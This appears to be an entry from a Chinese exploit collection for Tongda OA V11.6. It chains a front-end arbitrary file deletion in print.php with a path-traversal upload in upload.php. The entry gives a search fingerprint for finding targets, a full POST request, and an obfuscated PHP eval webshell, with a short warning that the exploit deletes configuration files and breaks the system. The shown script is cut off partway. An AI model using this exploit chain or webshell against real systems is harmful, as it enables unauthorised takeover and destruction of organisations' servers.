# 通达OAprint.php前台任意文件删除&getshell

- **系统**：通达OA　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`http://xx.xx.xx.xx/module/appbuilder/assets/print.php`

**请求体 / payload**
```
访问poc，影响`200`表示可能存在通达OA任意文件删除漏洞
1. 使用通达OA任意文件上传漏洞删除通达OA`auth.inc.php`文件
2. 通过后台文件上传漏洞上传webshell
POST /general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./ HTTP/1.1
Accept-Charset: GBK
Cookie: null;_SERVER=
Content-Type: multipart/form-data; boundary=********
Host: xx.xx.xx.xx
Content-Length: 240
--********
Content-Disposition: form-data; name="FILE1"; filename="shell.php"
<?php class Gpl5I2Tc { public function __construct($H9i75){ @eval("/*Zc3W78jv53*/".$H9i75."/*Zc3W78jv53*/"); }}new Gpl5I2Tc($_REQUEST['x']);?>
--********
3. 上传文件位置
http://xx.xx.…（脚本共 616 字，完整版见原文）
```

**其他**
- 通达OA print.php前台任意文件删除\&getshell: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
  * POC
  * EXP
***
- 版本: * 通达OA V11.6
* ⚠注意验证：该漏洞会删除配置文件，破坏系统，谨慎操作。